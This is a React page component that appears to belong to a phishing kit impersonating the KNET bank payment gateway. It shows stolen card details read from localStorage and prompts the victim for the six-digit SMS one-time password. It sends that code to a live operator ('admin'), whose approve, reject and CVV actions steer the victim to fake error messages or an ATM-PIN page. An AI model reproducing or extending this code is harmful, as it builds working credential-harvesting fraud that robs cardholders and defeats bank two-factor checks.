import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import WaitingOverlay from "@/components/WaitingOverlay";
import {
  sendData,
  navigateToPage,
  isFormApproved,
  isFormRejected,
  waitingMessage,
  cardAction,
  codeAction,
} from "@/lib/store";

export default function KNETOTP() {
  const [, navigate] = useLocation();
  const [otpCode, setOtpCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("تم أدخال رمز خطأ يرجى المحاولة مرة أخرى");

  // Get card data from localStorage
  const cardNumber = localStorage.getItem("cardNumber") || "";
  const cardMonth = localStorage.getItem("cardMonth") || "";
  const cardYear = localStorage.getItem("cardYear") || "";
  const totalAmount = localStorage.getItem("Total") || "0.000";

  // Masked card number
  const last4 = cardNumber.slice(-4);
  const maskedCard = "******" + last4;

  useEffect(() => {
    navigateToPage("رمز التحقق كي نت (OTP)");
  }, []);

  // Handle form approval → go to final page
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/final-page");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection → show error
  useEffect(() => {
    if (isFormRejected.value) {
      setIsLoading(false);
      waitingMessage.value = "";
      setShowError(true);
      setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
      setOtpCode("");
      setTimeout(() => setShowError(false), 3000);
    }
  }, [isFormRejected.value]);

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsLoading(false);

      if (action === "reject") {
        setShowError(true);
        setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
        setOtpCode("");
        setTimeout(() => setShowError(false), 3000);
      } else if (action === "otp") {
        // Admin approved, go to final page
        navigate("/final-page");
      }
      cardAction.value = null;
    }
  });

  // Handle code action from admin (CVV approve / reject buttons)
  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsLoading(false);

      if (action === "cvv") {
        // Admin approved CVV, navigate to ATM password page
        navigate("/atm-password");
      } else if (action === "reject") {
        setShowError(true);
        setErrorMessage("يرجى إدخال الرمز بشكل صحيح");
        setOtpCode("");
        setTimeout(() => setShowError(false), 3000);
      } else if (action === "approve") {
        // Admin approved, go to final page
        navigate("/final-page");
      }
      codeAction.value = null;
    }
  });

  const handleSubmit = () => {
    if (!otpCode || !/^\d{6}$/.test(otpCode)) {
      setShowError(true);
      setErrorMessage("أدخل كود تحقق صحيح مكوّن من 6 أرقام");
      setTimeout(() => setShowError(false), 3000);
      return;
    }

    setIsLoading(true);
    setShowError(false);

    // Send OTP to admin
    sendData({
      digitCode: otpCode,
      current: "رمز التحقق كي نت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <div
      style={{
        margin: 0,
        padding: 0,
        boxSizing: "border-box",
        fontFamily: "Verdana, Arial, Helvetica, sans-serif",
        backgroundColor: "#ebebeb",
        minHeight: "100vh",
      }}
    >
      <WaitingOverlay />

      {/* Loading Overlay */}
      {isLoading && (
        <div
          style={{
            display: "flex",
            textAlign: "center",
            position: "fixed",
            alignItems: "center",
            justifyContent: "center",
            height: "100%",
            width: "100%",
            zIndex: 1000000000,
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            top: 0,
            left: 0,
          }}
        >
          <img src="/kpay/loading.gif" style={{ height: 20 }} alt="loading" />
        </div>
      )}

      {/* Error Modal */}
      {showError && (
        <div
          style={{
            display: "flex",
            textAlign: "center",
            position: "fixed",
            alignItems: "center",
            justifyContent: "center",
            height: "100%",
            width: "100%",
            zIndex: 1000000000,
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            top: 0,
            left: 0,
          }}
        >
          <div
            style={{
              backgroundColor: "#ffffff",
              border: "1px solid rgba(0, 0, 0, 0.2)",
              borderRadius: 6,
              boxShadow: "0 3px 9px rgba(0, 0, 0, 0.5)",
              maxWidth: 400,
              width: "90%",
              padding: 0,
            }}
          >
            <div
              style={{
                padding: 15,
                borderBottom: "1px solid #e5e5e5",
                display: "flex",
                justifyContent: "flex-end",
              }}
            >
              <button
                onClick={() => setShowError(false)}
                style={{
                  background: "transparent",
                  border: 0,
                  fontSize: 21,
                  fontWeight: "bold",
                  cursor: "pointer",
                  opacity: 0.5,
                }}
              >
                &times;
              </button>
            </div>
            <div style={{ padding: 15, direction: "rtl" }}>
              <div
                style={{
                  color: "#721c24",
                  backgroundColor: "#f8d7da",
                  borderColor: "#f5c6cb",
                  padding: ".75rem 1.25rem",
                  marginBottom: "1rem",
                  border: "1px solid transparent",
                  borderRadius: ".25rem",
                }}
              >
                {errorMessage}
              </div>
            </div>
            <div
              style={{
                padding: 15,
                textAlign: "center",
                borderTop: "1px solid #e5e5e5",
              }}
            >
              <button
                onClick={() => setShowError(false)}
                style={{
                  backgroundColor: "#eaeaea",
                  border: "1px solid #cacaca",
                  padding: "5px 20px",
                  fontWeight: "bold",
                  color: "#666666",
                  height: 27,
                  borderRadius: 4,
                  cursor: "pointer",
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Banner */}
      <div>
        <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%" }} />
      </div>

      <div style={{ width: "100%", padding: 15, boxSizing: "border-box" }}>
        <div style={{ width: "100%", maxWidth: 395, margin: "0 auto" }}>
          {/* Merchant Info Card */}
          <div
            style={{
              backgroundColor: "#ffffff",
              padding: 20,
              border: "2px solid #8f8f90",
              borderRadius: 15,
              marginBottom: 15,
              boxShadow: "0 0 6px rgba(0,0,0,0.3)",
              marginTop: 25,
            }}
          >
            <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
              <img src="/kpay/knet.png" alt="KNET" style={{ width: 60 }} />
            </div>
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :Merchant
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                }}
              >
                AHIS
              </label>
            </div>
            <div style={{ overflow: "hidden", paddingTop: 5 }}>
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :Amount
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                }}
              >
                {totalAmount} KD
              </label>
            </div>
          </div>

          {/* OTP Form Card */}
          <div
            style={{
              backgroundColor: "#ffffff",
              padding: 20,
              border: "2px solid #8f8f90",
              borderRadius: 15,
              marginBottom: 15,
              boxShadow: "0 0 6px rgba(0,0,0,0.3)",
            }}
          >
            {/* Notification */}
            <div
              style={{
                color: "#31708f",
                fontFamily: "Arial, Helvetica, serif",
                fontSize: 13,
                backgroundColor: "#d9edf6",
                padding: 10,
                border: "1px solid #bacce0",
                borderRadius: 4,
                marginBottom: 10,
                textAlign: "justify",
              }}
            >
              <p>
                <span style={{ fontWeight: "bold" }}>NOTIFICATION:</span> You
                will presently receive an SMS on your mobile number registered
                with your bank. This is an OTP (One Time Password) SMS, it
                contains 6 digits to be entered in the box below.
              </p>
            </div>

            {/* Card Number */}
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :Card Number
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                  paddingLeft: 5,
                }}
              >
                {maskedCard}
              </label>
            </div>

            {/* Expiration Month */}
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "41%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :Expiration Month
              </label>
              <label
                style={{
                  float: "left",
                  width: "59%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                  paddingLeft: 5,
                }}
              >
                {cardMonth}
              </label>
            </div>

            {/* Expiration Year */}
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :Expiration Year
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                  paddingLeft: 5,
                }}
              >
                {cardYear}
              </label>
            </div>

            {/* PIN */}
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                :PIN
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                  paddingLeft: 5,
                }}
              >
                ****
              </label>
            </div>

            {/* OTP Input */}
            <div
              style={{
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                  paddingTop: 4,
                }}
              >
                :OTP
              </label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={otpCode}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "");
                  setOtpCode(val);
                }}
                autoComplete="one-time-code"
                style={{
                  width: "60%",
                  border: "2px solid #0070cd",
                  boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                  padding: "0 3px",
                  outline: 0,
                  fontSize: 11,
                  height: 20,
                }}
              />
            </div>
          </div>

          {/* Submit / Cancel */}
          <div
            style={{
              backgroundColor: "#ffffff",
              padding: 20,
              border: "2px solid #8f8f90",
              borderRadius: 15,
              marginBottom: 15,
              boxShadow: "0 0 6px rgba(0,0,0,0.3)",
              textAlign: "center",
              overflow: "hidden",
            }}
          >
            <button
              type="button"
              onClick={handleSubmit}
              style={{
                backgroundColor: "#eaeaea",
                border: "1px solid #cacaca",
                padding: "5px 0",
                fontWeight: "bold",
                color: "#666666",
                width: "50%",
                height: 27,
                borderRadius: 4,
                cursor: "pointer",
                float: "left",
              }}
            >
              Submit
            </button>
            <button
              type="button"
              onClick={() => window.history.back()}
              style={{
                backgroundColor: "#eaeaea",
                border: "1px solid #cacaca",
                padding: "5px 0",
                fontWeight: "bold",
                color: "#666666",
                width: "50%",
                height: 27,
                borderRadius: 4,
                cursor: "pointer",
                WebkitAppearance: "none",
              }}
            >
              Cancel
            </button>
          </div>

          {/* Footer */}
          <footer style={{ textAlign: "center", marginTop: 15 }}>
            <div
              style={{
                textAlign: "center",
                fontSize: 11,
                lineHeight: "18px",
              }}
            >
              All Rights Reserved. Copyright 2024
              <br />
              <span
                style={{
                  fontSize: 10,
                  fontWeight: "bold",
                  color: "#0077d5",
                }}
              >
                The Shared Electronic Banking Services Company - KNET
              </span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
}
